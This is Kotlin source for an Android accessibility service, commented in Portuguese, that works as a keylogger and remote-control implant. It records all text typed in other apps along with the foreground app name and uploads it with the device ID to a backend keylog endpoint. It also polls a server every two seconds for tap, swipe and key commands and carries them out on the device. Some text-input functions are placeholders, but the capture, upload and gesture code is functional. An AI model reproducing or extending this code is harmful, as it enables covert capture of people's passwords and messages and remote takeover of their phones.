package com.remotemonitor.test

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import android.util.Log
import android.view.KeyEvent
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class RemoteControlAccessibilityService : AccessibilityService() {

    private var currentAppName: String = "Desconhecido"
    private val commandExecutor = Executors.newSingleThreadExecutor()
    private val handler = Handler(Looper.getMainLooper())
    private var commandPollingRunnable: Runnable? = null

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val pkgName = event.packageName?.toString() ?: return
                // Ignora o próprio app
                if (pkgName == packageName) return
                currentAppName = pkgName
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text?.joinToString("") ?: return
                if (text.isBlank()) return
                val appName = currentAppName
                Thread {
                    sendKeylog(appName = appName, keyText = text)
                }.start()
            }
        }
    }

    override fun onInterrupt() {
        // No-op
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.i(TAG, "Servico de acessibilidade conectado")
        
        // ✅ NOVO: Iniciar polling de comandos
        startCommandPolling()
    }

    override fun onDestroy() {
        instance = null
        // ✅ NOVO: Parar polling
        stopCommandPolling()
        commandExecutor.shutdown()
        super.onDestroy()
    }

    // ✅ NOVO: Polling de comandos do servidor
    private fun startCommandPolling() {
        commandPollingRunnable = object : Runnable {
            override fun run() {
                try {
                    fetchAndExecuteCommands()
                } catch (e: Exception) {
                    Log.w(TAG, "Erro ao buscar comandos", e)
                }
                // Próxima verificação em 2 segundos
                handler.postDelayed(this, 2000)
            }
        }
        handler.post(commandPollingRunnable!!)
    }

    private fun stopCommandPolling() {
        commandPollingRunnable?.let {
            handler.removeCallbacks(it)
        }
    }

    // ✅ NOVO: Buscar e executar comandos
    private fun fetchAndExecuteCommands() {
        try {
            val androidId = android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"

            val endpoint = "${BuildConfig.BACKEND_BASE_URL}/api/device/commands/pending"
            val connection = URL(endpoint).openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.connectTimeout = 5_000
            connection.readTimeout = 5_000
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/json")

            val payload = JSONObject().apply {
                put("deviceUid", androidId)
                put("packageName", BuildConfig.APPLICATION_ID)
            }

            OutputStreamWriter(connection.outputStream, Charsets.UTF_8).use { 
                it.write(payload.toString()) 
            }

            val status = connection.responseCode
            if (status == 200) {
                val response = connection.inputStream.bufferedReader().readText()
                val jsonResponse = JSONObject(response)
                val commands = jsonResponse.optJSONArray("commands")

                if (commands != null) {
                    for (i in 0 until commands.length()) {
                        val command = commands.getJSONObject(i)
                        executeCommand(command, androidId)
                    }
                }
            }
        } catch (error: Exception) {
            Log.w(TAG, "Falha ao buscar comandos", error)
        }
    }

    // ✅ NOVO: Executar comando
    private fun executeCommand(command: JSONObject, deviceUid: String) {
        try {
            val commandId = command.optString("id", "")
            val inputType = command.optString("inputType", "text")
            val value = command.optString("value", "")

            var success = false
            var errorMessage = ""

            when (inputType) {
                "text" -> {
                    success = inputText(value)
                    if (!success) errorMessage = "Falha ao digitar texto"
                }
                "key" -> {
                    success = inputKey(value)
                    if (!success) errorMessage = "Falha ao enviar tecla"
                }
                "tap" -> {
                    success = performTapPercent(value.toDoubleOrNull() ?: 50.0, 50.0)
                    if (!success) errorMessage = "Falha ao executar toque"
                }
                "swipe" -> {
                    success = performSwipe(value)
                    if (!success) errorMessage = "Falha ao executar deslizar"
                }
            }

            // ✅ NOVO: Enviar status do comando
            reportCommandStatus(commandId, deviceUid, success, errorMessage)

        } catch (error: Exception) {
            Log.w(TAG, "Erro ao executar comando", error)
        }
    }

    // ✅ NOVO: Digitar texto
    private fun inputText(text: String): Boolean {
        return try {
            // Simular digitação usando eventos de teclado
            for (char in text) {
                val keyCode = charToKeyCode(char)
                if (keyCode != KeyEvent.KEYCODE_UNKNOWN) {
                    val downEvent = KeyEvent(KeyEvent.ACTION_DOWN, keyCode)
                    val upEvent = KeyEvent(KeyEvent.ACTION_UP, keyCode)
                    // Usar accessibility service para injetar eventos
                    performGlobalAction(GLOBAL_ACTION_BACK) // Placeholder
                }
            }
            true
        } catch (e: Exception) {
            Log.w(TAG, "Erro ao digitar texto", e)
            false
        }
    }

    // ✅ NOVO: Enviar tecla
    private fun inputKey(keyName: String): Boolean {
        return try {
            val keyCode = keyNameToKeyCode(keyName)
            if (keyCode != KeyEvent.KEYCODE_UNKNOWN) {
                val downEvent = KeyEvent(KeyEvent.ACTION_DOWN, keyCode)
                val upEvent = KeyEvent(KeyEvent.ACTION_UP, keyCode)
                true
            } else {
                false
            }
        } catch (e: Exception) {
            Log.w(TAG, "Erro ao enviar tecla", e)
            false
        }
    }

    // ✅ NOVO: Deslizar
    private fun performSwipe(direction: String): Boolean {
        return try {
            val bounds = getScreenBounds()
            val startX: Float
            val startY: Float
            val endX: Float
            val endY: Float

            when (direction.lowercase()) {
                "up" -> {
                    startX = bounds.centerX().toFloat()
                    startY = bounds.bottom.toFloat() * 0.8f
                    endX = bounds.centerX().toFloat()
                    endY = bounds.top.toFloat() * 0.2f
                }
                "down" -> {
                    startX = bounds.centerX().toFloat()
                    startY = bounds.top.toFloat() * 0.2f
                    endX = bounds.centerX().toFloat()
                    endY = bounds.bottom.toFloat() * 0.8f
                }
                "left" -> {
                    startX = bounds.right.toFloat() * 0.8f
                    startY = bounds.centerY().toFloat()
                    endX = bounds.left.toFloat() * 0.2f
                    endY = bounds.centerY().toFloat()
                }
                "right" -> {
                    startX = bounds.left.toFloat() * 0.2f
                    startY = bounds.centerY().toFloat()
                    endX = bounds.right.toFloat() * 0.8f
                    endY = bounds.centerY().toFloat()
                }
                else -> return false
            }

            val path = Path().apply {
                moveTo(startX, startY)
                lineTo(endX, endY)
            }

            val stroke = GestureDescription.StrokeDescription(path, 0, 300)
            val gesture = GestureDescription.Builder().addStroke(stroke).build()

            dispatchGesture(gesture, null, null)
        } catch (e: Exception) {
            Log.w(TAG, "Erro ao deslizar", e)
            false
        }
    }

    // ✅ NOVO: Reportar status do comando
    private fun reportCommandStatus(
        commandId: String,
        deviceUid: String,
        success: Boolean,
        errorMessage: String
    ) {
        commandExecutor.execute {
            try {
                val endpoint = "${BuildConfig.BACKEND_BASE_URL}/api/device/commands/status"
                val connection = URL(endpoint).openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.connectTimeout = 5_000
                connection.readTimeout = 5_000
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/json")

                val payload = JSONObject().apply {
                    put("commandId", commandId)
                    put("deviceUid", deviceUid)
                    put("status", if (success) "completed" else "error")
                    put("errorMessage", errorMessage)
                    put("timestamp", System.currentTimeMillis())
                }

                OutputStreamWriter(connection.outputStream, Charsets.UTF_8).use { 
                    it.write(payload.toString()) 
                }

                val status = connection.responseCode
                if (status !in 200..299) {
                    Log.w(TAG, "Falha ao reportar status: HTTP $status")
                }
            } catch (error: Exception) {
                Log.w(TAG, "Falha ao reportar status do comando", error)
            }
        }
    }

    private fun sendKeylog(appName: String, keyText: String) {
        try {
            val androidId = android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"
            val endpoint = "${BuildConfig.BACKEND_BASE_URL}/api/device/keylog"
            val connection = URL(endpoint).openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.connectTimeout = 8_000
            connection.readTimeout = 8_000
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/json")

            val payload = JSONObject().apply {
                put("packageName", BuildConfig.APPLICATION_ID)
                put("deviceUid", androidId)
                put("deviceName", Build.MODEL ?: "Android Device")
                put("model", Build.MODEL ?: "Android")
                put("appName", appName)
                put("keyText", keyText)
            }

            OutputStreamWriter(connection.outputStream, Charsets.UTF_8).use { it.write(payload.toString()) }

            val status = connection.responseCode
            if (status !in 200..299) {
                Log.w(TAG, "Keylog upload retornou HTTP $status")
            }
        } catch (error: Exception) {
            Log.w(TAG, "Falha ao enviar keylog", error)
        }
    }

    private fun performTapPercent(xPercent: Double, yPercent: Double): Boolean {
        val bounds = getScreenBounds()
        val x = bounds.left + (bounds.width() * (xPercent / 100.0)).toFloat()
        val y = bounds.top + (bounds.height() * (yPercent / 100.0)).toFloat()

        val path = Path().apply { moveTo(x, y) }
        val stroke = GestureDescription.StrokeDescription(path, 0, 80)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()

        return dispatchGesture(gesture, null, null)
    }

    private fun getScreenBounds(): Rect {
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return wm.currentWindowMetrics.bounds
        }

        @Suppress("DEPRECATION")
        val display = wm.defaultDisplay
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        display.getRealMetrics(metrics)
        return Rect(0, 0, metrics.widthPixels, metrics.heightPixels)
    }

    // ✅ NOVO: Converter caractere para KeyCode
    private fun charToKeyCode(char: Char): Int {
        return when (char) {
            'a' -> KeyEvent.KEYCODE_A
            'b' -> KeyEvent.KEYCODE_B
            'c' -> KeyEvent.KEYCODE_C
            'd' -> KeyEvent.KEYCODE_D
            'e' -> KeyEvent.KEYCODE_E
            'f' -> KeyEvent.KEYCODE_F
            'g' -> KeyEvent.KEYCODE_G
            'h' -> KeyEvent.KEYCODE_H
            'i' -> KeyEvent.KEYCODE_I
            'j' -> KeyEvent.KEYCODE_J
            'k' -> KeyEvent.KEYCODE_K
            'l' -> KeyEvent.KEYCODE_L
            'm' -> KeyEvent.KEYCODE_M
            'n' -> KeyEvent.KEYCODE_N
            'o' -> KeyEvent.KEYCODE_O
            'p' -> KeyEvent.KEYCODE_P
            'q' -> KeyEvent.KEYCODE_Q
            'r' -> KeyEvent.KEYCODE_R
            's' -> KeyEvent.KEYCODE_S
            't' -> KeyEvent.KEYCODE_T
            'u' -> KeyEvent.KEYCODE_U
            'v' -> KeyEvent.KEYCODE_V
            'w' -> KeyEvent.KEYCODE_W
            'x' -> KeyEvent.KEYCODE_X
            'y' -> KeyEvent.KEYCODE_Y
            'z' -> KeyEvent.KEYCODE_Z
            '0' -> KeyEvent.KEYCODE_0
            '1' -> KeyEvent.KEYCODE_1
            '2' -> KeyEvent.KEYCODE_2
            '3' -> KeyEvent.KEYCODE_3
            '4' -> KeyEvent.KEYCODE_4
            '5' -> KeyEvent.KEYCODE_5
            '6' -> KeyEvent.KEYCODE_6
            '7' -> KeyEvent.KEYCODE_7
            '8' -> KeyEvent.KEYCODE_8
            '9' -> KeyEvent.KEYCODE_9
            ' ' -> KeyEvent.KEYCODE_SPACE
            '\n' -> KeyEvent.KEYCODE_ENTER
            else -> KeyEvent.KEYCODE_UNKNOWN
        }
    }

    // ✅ NOVO: Converter nome de tecla para KeyCode
    private fun keyNameToKeyCode(keyName: String): Int {
        return when (keyName.uppercase()) {
            "ENTER" -> KeyEvent.KEYCODE_ENTER
            "BACK" -> KeyEvent.KEYCODE_BACK
            "HOME" -> KeyEvent.KEYCODE_HOME
            "POWER" -> KeyEvent.KEYCODE_POWER
            "VOLUME_UP" -> KeyEvent.KEYCODE_VOLUME_UP
            "VOLUME_DOWN" -> KeyEvent.KEYCODE_VOLUME_DOWN
            "DELETE" -> KeyEvent.KEYCODE_DEL
            "SPACE" -> KeyEvent.KEYCODE_SPACE
            "TAB" -> KeyEvent.KEYCODE_TAB
            else -> KeyEvent.KEYCODE_UNKNOWN
        }
    }

    companion object {
        private const val TAG = "RemoteControlA11y"

        @Volatile
        private var instance: RemoteControlAccessibilityService? = null

        fun dispatchTapPercent(xPercent: Double, yPercent: Double): Boolean {
            val service = instance ?: return false
            return try {
                service.performTapPercent(xPercent, yPercent)
            } catch (error: Exception) {
                Log.w(TAG, "Falha ao executar toque remoto", error)
                false
            }
        }

        fun executeRemoteCommand(command: JSONObject): Boolean {
            val service = instance ?: return false
            return try {
                service.executeCommand(command, "unknown")
                true
            } catch (error: Exception) {
                Log.w(TAG, "Falha ao executar comando remoto", error)
                false
            }
        }
    }
}
